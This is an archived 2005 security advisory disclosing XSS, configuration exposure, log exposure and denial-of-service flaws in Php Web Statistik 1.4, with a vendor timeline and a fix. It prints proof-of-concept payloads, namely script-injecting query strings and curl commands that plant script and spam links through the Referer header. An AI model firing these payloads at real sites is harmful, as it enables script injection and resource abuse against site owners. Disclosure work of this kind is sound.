=== Content from www.ush.it_90714d35_20250125_051316.html ===

# [ush.it - a beautiful place](/)

[⇲](#footer)
### [Php Web Statistik Multiple Vulnerabilities](/2005/11/19/php-web-statistik/)

November 19, 2005 at 5:19 pm - Filed under [Hacks](/category/hacks/), [Language EN](/category/language-en/) - 596 words, reading time ~1 minutes - [Permalink](/2005/11/19/php-web-statistik/) - [Comments](http://news.ycombinator.com/submitlink?u=http://www.ush.it/2005/11/19/php-web-statistik/&t=Php%20Web%20Statistik%20Multiple%20Vulnerabilities)

Php Web Statistik is vulnerable to javascript and html injection using the unchecked lastnumber variable, proper input validation will fix. Just place an intval() at the right row. Other vulnerabilities has been discovered later.

This is a medium level risk.

```

Php Web Statistik Multiple Vulnerabilities

 Name              Multiple Vulnerabilities in Php Web Statistik
 Systems Affected  Php Web Statistik (verified on 1.4)
 Severity          Medium Risk
 Vendor            www.php-web-statistik.de
 Advisory          http://www_ush_it/2005/11/19/php-web-statistik/
 Author            Francesco â??aSciiâ?? Ongaro (ascii at katamail . com)
 Date              20051119

I. BACKGROUND

Php Web Statistik is a php stats program, more information is
available at the vendor site.

II. DESCRIPTION

a) XSS

While lastnumber _GET var should be a positive integer no
input validation or casting assure this. Single quotes seems
to be scaped with a backslash (\').

stat.php?lastnumber=urlencoded%20text

b) Config exposure

The configuration file can be reached in the basepath by GET.

/stat/stat.cfg

directory=log/logdb.dta

c) Log database exposure

Using the value of "directory" in the configuration file you can
find the correct location of the whole database even when you
can't list directory contents.

d) Application level dos, resource usage

stat.php?lastnumber=big-int caused the script wit the php time
limit on our test machine.

e) XSS using the referer field

The value will be stored in the flat database file.

curl -A Opera http://the.vict.im/stat/pixel.php -e
"<a href=http://www.referer.spam>go-google</a>"

curl -A Opera http://the.vict.im/stat/pixel.php -e
"<script>alert(123123);</script>"

And shown on the backend (good news pr spammers).

f) Disk and quota misuse

The program don't rotate the db so you can misuse the remote
disk quota with multiple queries like this:

curl -A Opera http://www.vict.im/stat/pixel.php -e "WW[..]WWW"

Note the referer field can be >2kb.

III. ANALYSIS

This vulnerability can be exploited by a GET query.

stat.php?lastnumber=%3Cscript%3Ealert(123456789);%3C/script%3E

IV. DETECTION

Php Web Statistik 1.4 is vulnerable.
Older version not verified.

V. WORKAROUND

Input validation will fix the vulnerability. Cast (int)intval($input)
and limit the range (0-600 for example).

A collateral consequence of this is a small application
level dos (you just hit the SetTimeLimit value of the
php enviroment) as follow:

stat.php?lastnumber=2341694882134812734613478

last 2341694882134812734613478 hits

Fatal error: Maximum execution time of 30 seconds exceeded in
/var/www/localhost/htdocs/mambo/stat/stat.php on line 711
nr. timestamp hostname browser operating system site referrer

VI. VENDOR RESPONSE

Vendor invite you to download the new version from freewebstat.com.

VII. CVE INFORMATION

No CVE at this time.

VIII. DISCLOSURE TIMELINE

20051119 Bug discovered
20051119 Developer notification
20051119 Advisory released
20051121 Vendor response

IX. CREDIT

ascii is credited with the discovery of this vulnerability.

X. LEGAL NOTICES

Copyright (c) 2005 Francesco â??aSciiâ?? Ongaro

Permission is granted for the redistribution of this alert
electronically. It may not be edited in any way without mine express
written consent. If you wish to reprint the whole or any
part of this alert in any other medium other than electronically, please
email me for permission.

Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.

```

[⇱](#header)

[Need professional Information Security services? Call ISGroup!](https://www.isgroup.it/ "ISGroup - Information Security Group")

* [Free Services](/free-services/)
* [Proxy tools](/free-services/proxy-tools/)
* [Security directory](/free-services/directory/)
* [Security tools](/free-services/security-tools/)
* [Services](/services/)
* [USH manifest](/staff/)
* [Antonio `s4tan` Parata](/staff/antonio-s4tan-parata/)
* [Francesco `ascii` Ongaro](/staff/francesco-ascii-ongaro/)
* [Marco `saidone` Marini](/staff/marco-saidone-marini/)
* [Michele `liver` Bottari](/staff/michele-liver-bottari/)
* [Pasquale `sid` Fiorillo](/staff/pasquale-sid-fiorillo/)

## Archives

* [2024](/2024/)
* [May](/2024/05/)
* [2017](/2017/)
* [September](/2017/09/)
* [March](/2017/03/)
* [2015](/2015/)
* [October](/2015/10/)
* [2012](/2012/)
* [November](/2012/11/)
* [2011](/2011/)
* [April](/2011/04/)
* [2010](/2010/)
* [November](/2010/11/)
* [January](/2010/01/)
* [2009](/2009/)
* [October](/2009/10/)
* [August](/2009/08/)
* [July](/2009/07/)
* [June](/2009/06/)
* [May](/2009/05/)
* [March](/2009/03/)
* [February](/2009/02/)
* [January](/2009/01/)
* [2008](/2008/)
* [December](/2008/12/)
* [November](/2008/11/)
* [September](/2008/09/)
* [August](/2008/08/)
* [July](/2008/07/)
* [May](/2008/05/)
* [April](/2008/04/)
* [2007](/2007/)
* [October](/2007/10/)
* [August](/2007/08/)
* [July](/2007/07/)
* [June](/2007/06/)
* [May](/2007/05/)
* [April](/2007/04/)
* [March](/2007/03/)
* [January](/2007/01/)
* [2006](/2006/)
* [December](/2006/12/)
* [November](/2006/11/)
* [July](/2006/07/)
* [May](/2006/05/)
* [April](/2006/04/)
* [March](/2006/03/)
* [February](/2006/02/)
* [January](/2006/01/)
* [2005](/2005/)
* [November](/2005/11/)
* [October](/2005/10/)
* [September](/2005/09/)

## Categories

* [Hacks (54)](/category/hacks/)
* [Insecurity (17)](/category/insecurity/)
* [Language EN (61)](/category/language-en/)
* [Language IT (19)](/category/language-it/)
* [Readings (7)](/category/readings/)
* [Reports (10)](/category/reports/)
* [Team (6)](/category/team/)

[Need professional Information Security services? Call ISGroup!](https://www.isgroup.biz/ "ISGroup - Information Security Group")

THP
[USH](http://www.ush.it/)
[Wisec](http://www.wisec.it/)
[DigitalBullets](http://www.digitalbullets.org/)



=== Content from securityreason.com_b6d81c3d_20250125_051315.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


